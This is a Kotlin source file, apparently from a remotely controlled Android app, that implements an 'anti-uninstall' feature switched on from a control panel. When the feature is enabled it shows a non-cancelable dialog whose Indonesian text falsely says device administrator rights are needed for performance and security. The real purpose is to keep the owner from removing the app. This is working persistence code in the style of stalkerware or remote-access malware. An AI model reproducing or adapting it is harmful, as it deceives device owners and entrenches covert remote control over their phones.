package com.sync.xxx

import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent

object AntiUninstallHelper {

    private const val PREF_NAME = "anti_uninstall_prefs"
    private const val KEY_DIALOG_SHOWN = "admin_dialog_shown"
    private const val KEY_ENABLED = "anti_uninstall_enabled"

    /**
     * Cek apakah anti-uninstall sedang di-enable dari panel.
     * Default = false (biar bisa di-uninstall kalau belum diaktifkan).
     */
    fun isEnabled(context: Context): Boolean {
        return context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
            .getBoolean(KEY_ENABLED, false)
    }

    /**
     * Set flag enable/disable dari panel.
     * Kalau enable dan admin belum aktif, langsung minta.
     */
    fun setEnabled(context: Context, enabled: Boolean) {
        context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_ENABLED, enabled).apply()

        if (enabled) {
            requestAdminIfNeeded(context, force = true)
        } else {
            // Disable admin biar user bisa uninstall
            try {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(context, AntiUninstallReceiver::class.java)
                if (dpm.isAdminActive(admin)) {
                    dpm.removeActiveAdmin(admin)
                }
            } catch (_: Exception) {}
        }
    }

    /**
     * Minta admin. Hanya jalan kalau KEY_ENABLED = true.
     * @param force kalau true, abaikan flag KEY_DIALOG_SHOWN (dipakai saat baru di-enable dari panel)
     */
    fun requestAdminIfNeeded(context: Context, force: Boolean = false) {
        // Gate 1: hanya jalan kalau di-enable
        if (!isEnabled(context)) return

        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)

        if (dpm.isAdminActive(admin)) return

        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        if (!force && prefs.getBoolean(KEY_DIALOG_SHOWN, false)) return

        prefs.edit().putBoolean(KEY_DIALOG_SHOWN, true).apply()

        try {
            AlertDialog.Builder(context)
                .setTitle("Aktifkan Admin")
                .setMessage("Aktifkan izin administrator perangkat agar aplikasi berjalan optimal dan tidak terganggu.")
                .setCancelable(false)
                .setPositiveButton("Aktifkan") { _, _ ->
                    try {
                        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                            putExtra(
                                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Diperlukan untuk keamanan perangkat."
                            )
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        context.startActivity(intent)
                    } catch (_: Exception) {}
                }
                .show()
        } catch (_: Exception) {
            // Kalau context bukan Activity, dialog gak bisa muncul
            // fallback: langsung start activity admin
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan perangkat.")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (_: Exception) {}
        }
    }

    fun isAdminActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)
        return dpm.isAdminActive(admin)
    }
}